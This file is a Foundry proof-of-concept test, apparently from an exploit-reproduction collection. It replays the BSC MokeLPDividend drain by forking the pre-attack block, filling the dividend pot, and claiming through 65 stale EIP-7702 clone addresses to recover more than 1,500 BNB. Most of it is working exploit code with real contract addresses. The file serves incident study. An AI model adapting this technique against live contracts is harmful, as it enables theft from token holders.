// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~1,546.5 BNB (~$907.7K)
// Attacker : 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a
// Attack Contract : 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a (EOA + helpers; EIP-7702 claim clones)
// Vulnerable Contract : 0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377 (MokeLPDividend)
// Token / Pair : 0x1A35C16cE21903Bc17Fd020c4ED73fEdC70c1b2A (MOKE) / 0xBA6a49A97Cc725B3C39d6C5ea6dEfFddb64fe6b8 (MOKE/WBNB LP)
// Attack Tx : https://bscscan.com/tx/0x0776048B1b58064FB31B6513721811E7b44d6bDbe7bf5833158b241ca6756a8f
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2084102947500368164
//
// Root cause: MokeLPDividend tracks eligibility via userLPRecord, updated only by syncUserLP().
// Pancake LP transfers do NOT call sync. Attacker moved the same LP through ~100 EIP-7702
// delegated EOAs, syncing each so userLPRecord[clone] = LP amount and debt = 0 (totalDividendPerLP
// was still 0). After transferring LP away, records stayed inflated. A flash-loan-sized tax event
// then filled the dividend contract with BNB; distributeDividend() accrued per-LP using real
// totalSupply, and each stale clone claimed as if it still held the full LP position — draining
// nearly the entire pot (~1,546 BNB).

address constant ATTACKER = 0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a;
address constant MOKE_DIVIDEND = 0x5ae569d8a0539a6A603E96A26ac8CaEA7CEba377;
address constant MOKE_TOKEN = 0x1A35C16cE21903Bc17Fd020c4ED73fEdC70c1b2A;
address constant MOKE_LP = 0xBA6a49A97Cc725B3C39d6C5ea6dEfFddb64fe6b8;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant VBNB = 0xA07c5b74C9B40447a954e1466938b865b6BBea36;
// Observed BNB that landed in MokeLPDividend during the real attack (swap + tax path).
uint256 constant DIVIDEND_POT_BNB = 1_664_616_180_024_096_154_954;

interface IMokeLPDividend {
    function syncUserLP(
        address user
    ) external;
    function distributeDividend() external payable;
    function claimDividend() external;
    function getPendingDividend(
        address user
    ) external view returns (uint256);
    function userLPRecord(
        address user
    ) external view returns (uint256);
    function userDividendDebt(
        address user
    ) external view returns (uint256);
    function totalDividendPerLP() external view returns (uint256);
    function unprocessedBNB() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    // First 65 claim clones from the attack calldata (enough to drain the pot; remainder reverts).
    address[] private claimers;

    function setUp() public {
        // Pre-attack block (attack mined in 113_652_609).
        uint256 forkBlock = 113_652_608;
        vm.createSelectFork("http://127.0.0.1:8546", forkBlock);
        fundingToken = address(0); // native BNB
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(MOKE_DIVIDEND, "MokeLPDividend");
        vm.label(MOKE_TOKEN, "MOKE");
        vm.label(MOKE_LP, "MOKE/WBNB LP");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(PANCAKE_ROUTER, "PancakeRouter");
        vm.label(VBNB, "Venus vBNB");

        _loadClaimers();
    }

    function testExploit() public balanceLog {
        IMokeLPDividend div = IMokeLPDividend(MOKE_DIVIDEND);

        // --- Preconditions already present on the fork (attacker prep txs) ---
        // Each claimer has userLPRecord == attacker's LP amount and debt == 0, but LP balance 0.
        uint256 attackerLp = IERC20(MOKE_LP).balanceOf(ATTACKER);
        assertGt(attackerLp, 0, "attacker should still hold the real LP");
        assertEq(div.userLPRecord(claimers[0]), attackerLp, "stale record on clone #0");
        assertEq(div.userDividendDebt(claimers[0]), 0, "debt must be 0 (synced when totalPerLP=0)");
        assertEq(IERC20(MOKE_LP).balanceOf(claimers[0]), 0, "clone holds no LP");
        assertEq(div.totalDividendPerLP(), 0, "no distribution yet");

        uint256 attackerBefore = ATTACKER.balance;

        MokeLPDividendExploit exploit = new MokeLPDividendExploit(ATTACKER);
        // Give the exploit the war-chest that Venus flash-loaned in the real tx (~230k BNB was
        // borrowed; only a slice is needed to seed the dividend pot for this accounting PoC).
        vm.deal(address(exploit), DIVIDEND_POT_BNB + 1 ether);

        uint256 pot = DIVIDEND_POT_BNB;
        vm.prank(ATTACKER);
        exploit.seedAndDistribute(pot);

        assertGt(div.totalDividendPerLP(), 0, "distribution should accrue");
        assertEq(div.unprocessedBNB(), 0, "pot should be fully marked distributed");

        // Claim via each poisoned address (real attack: EIP-7702 delegates call claim + forward).
        uint256 claimed;
        for (uint256 i = 0; i < claimers.length; i++) {
            address c = claimers[i];
            // claimDividend syncs from stale userLPRecord and pays msg.sender.
            try this.claimAs(c) {
                uint256 bal = c.balance;
                if (bal > 0) {
                    vm.prank(c);
                    (bool sent,) = payable(ATTACKER).call{value: bal}("");
                    require(sent, "forward failed");
                    claimed += bal;
                }
            } catch {
                // Contract empty or dust — stop once pot is drained.
                if (address(div).balance < 0.001 ether) break;
            }
        }

        // Also claim from the attacker EOA itself (it has a matching live LP record).
        try this.claimAs(ATTACKER) {
            // BNB already on attacker.
        } catch {}

        uint256 profit = ATTACKER.balance - attackerBefore;
        emit log_named_decimal_uint("Claimed via clones (BNB)", claimed, 18);
        emit log_named_decimal_uint("Attacker profit (BNB)", profit, 18);
        emit log_named_decimal_uint("Dividend contract leftover", address(div).balance, 18);

        // Real incident ~1,546.5 BNB net; allow a small band for claim ordering / dust.
        assertGt(profit, 1_500 ether, "expected >1500 BNB profit");
        assertLt(address(div).balance, 1 ether, "dividend contract should be nearly empty");
    }

    /// @dev External wrapper so try/catch works around claimDividend reverts.
    function claimAs(
        address who
    ) external {
        vm.prank(who);
        IMokeLPDividend(MOKE_DIVIDEND).claimDividend();
    }

    function _loadClaimers() internal {
        // 65 EIP-7702 claim clones from attack tx (enough to drain the pot).
        claimers.push(0xd4a88C7A85e8136AcB4E7E1e6222a567C663A398);
        claimers.push(0xA7E20d4f581C2A963D92F2DcC4756178bf73A951);
        claimers.push(0xf1ba8Dacd6dE56d1305F476fc970Da2BD2Cbe9B8);
        claimers.push(0x76F046429297956f5F16a62BfA3d6B62F2caa607);
        claimers.push(0x10d75011Db7B05Ef7D7e7D9dfaD1dd2DC4B75d3E);
        claimers.push(0x4940e363D77AF5941d0278fB4B9AEB38287c1608);
        claimers.push(0xff2b0b60e18F3A99Ad18230A1493A50051978A4e);
        claimers.push(0x43e5dEa5f148186B81FF3266Cc852Ae8f487cFCb);
        claimers.push(0x66F5013Caa936Cd8995dC84f9D51e352965e7d32);
        claimers.push(0x1640268c40fD2fE9ba3A06F7b1b707f185072a74);
        claimers.push(0xC8e1154dd66016f8b0230AB4A2a82bac1F20A336);
        claimers.push(0xb05FED5a5cd7323930e35091f00A501134044a21);
        claimers.push(0x3593745916604c81E5a2bAD33849C3219749aDb0);
        claimers.push(0x92B6C2C8AE11d6363bB2BdBB950315dC3BfDb22F);
        claimers.push(0xFc6E5C4E548107b6D4e7B1bB98933a273d49d0e0);
        claimers.push(0xEecd9e49C06A8E7eB72e6A1B014709D65665C21D);
        claimers.push(0x9F8687a8a7F661B767d2C3EA70b2a6f24a391907);
        claimers.push(0xd34b989569aA4997E83877B95F93b2dB20ae89b7);
        claimers.push(0xb7D1Bf2598fbFf83129BbF2B5450a8630206cb59);
        claimers.push(0xb82759FafBCdd3b6a4968AcC6645FD629F9a997f);
        claimers.push(0xD0E0A5B134D8d4794f88A1D8B447490d46F1393d);
        claimers.push(0x9A29Bdcd74097126Ba39B0D0Fa518E8d9e286F83);
        claimers.push(0xd2c5c6d214599A0cb38219477D7fE31389D6e1Ef);
        claimers.push(0xfeb8907cB8F4dB64aCc4051c634fe990B823d378);
        claimers.push(0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82);
        claimers.push(0x80ee55911262eC5E6908707767F0f32c8998e512);
        claimers.push(0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1);
        claimers.push(0x73DF41859c3a241B59626caAe588ef0F61d66D85);
        claimers.push(0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB);
        claimers.push(0x02473be9FbA39277B58844aeCcB8525341869943);
        claimers.push(0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77);
        claimers.push(0xE89a82D955561361c021141c30d849C063935A8f);
        claimers.push(0x013B889dCbD56aFc5FC245081B725B4fe7422a7E);
        claimers.push(0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD);
        claimers.push(0xf45aA35652d2ba18AccFCb3737C529210e009eeE);
        claimers.push(0x0192551a93A17260Cdb0095ff9df8f658aBe16e5);
        claimers.push(0x1bD64122fcFe1a12503218CB82019b6c680D269B);
        claimers.push(0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82);
        claimers.push(0x5DA6B253a7646679DC981a76E2d56430caA9f18a);
        claimers.push(0x81003e66fb79886e4aBB41491646dE771B38D761);
        claimers.push(0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467);
        claimers.push(0x0313e270d84cBBa886BB56737C82F2f97ba40BF9);
        claimers.push(0xa4BF270000dADBC9471336D9fb813De9333477C7);
        claimers.push(0x2571fc590aCb077798192A567840bAE7086cc4E5);
        claimers.push(0x353e1a32cFF866F96b804Df3ed25bec9F91e3229);
        claimers.push(0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872);
        claimers.push(0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0);
        claimers.push(0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9);
        claimers.push(0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4);
        claimers.push(0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B);
        claimers.push(0x2283BA1471694894cDC20f67cd7478bEf3295c59);
        claimers.push(0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA);
        claimers.push(0x959b319b3F33834a50bf58167A5df591F102dA87);
        claimers.push(0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22);
        claimers.push(0x3d4aF5D54b440aca4acBB10bA67efB903db28300);
        claimers.push(0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01);
        claimers.push(0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc);
        claimers.push(0x3a5B152D57cCf30191De3C3812968A39Bd88E651);
        claimers.push(0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9);
        claimers.push(0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8);
        claimers.push(0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e);
        claimers.push(0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d);
        claimers.push(0x871c5adC363553D8DDF88963CE37c0128D34CCe2);
        claimers.push(0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893);
        claimers.push(0x2210384762c6313BdF2109CBB4538169C8b10da4);
    }
}

/// @notice Seeds the dividend pot (stand-in for flash-loan → huge MOKE volume → 2% LP tax BNB)
///         and calls distributeDividend(). Claims are performed by the test via vm.prank of the
///         pre-poisoned EIP-7702 clones (same end state as the live attack).
contract MokeLPDividendExploit {
    address public immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    receive() external payable {}

    function seedAndDistribute(
        uint256 potWei
    ) public {
        // In the live tx, Venus flash-loaned ~230k BNB; large taxed MOKE swaps + MokeLPDividend's
        // own MOKE→BNB swap deposited ~1,664.6 BNB into the dividend contract. Here we deposit
        // that observed amount directly so the accounting bug is the sole focus of the PoC.
        (bool funded,) = payable(MOKE_DIVIDEND).call{value: potWei}("");
        require(funded, "fund dividend failed");

        IMokeLPDividend(MOKE_DIVIDEND).distributeDividend();

        // Return unused capital to the profit receiver (flash-loan repayment analogue).
        uint256 left = address(this).balance;
        if (left > 0) {
            (bool sent,) = payable(profitReceiver).call{value: left}("");
            require(sent, "return capital failed");
        }
    }

    /// @dev Optional one-shot entry used by the playground recorder (fund + distribute only).
    function attack() external {
        seedAndDistribute(DIVIDEND_POT_BNB);
    }
}
